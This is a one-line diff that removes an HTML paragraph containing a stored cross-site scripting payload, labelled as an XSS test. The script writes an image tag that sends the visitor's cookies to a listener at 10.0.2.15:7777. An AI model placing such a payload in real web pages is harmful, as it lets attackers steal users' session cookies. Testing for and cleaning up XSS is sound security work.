@@ -1,1 +1,0 @@
-<p>Hello Folks, <script>document.write('<img src=http://10.0.2.15:7777?cookie=' + escape(document.cookie) +  ' >'); </script> This script tests an XSS attack.</p>
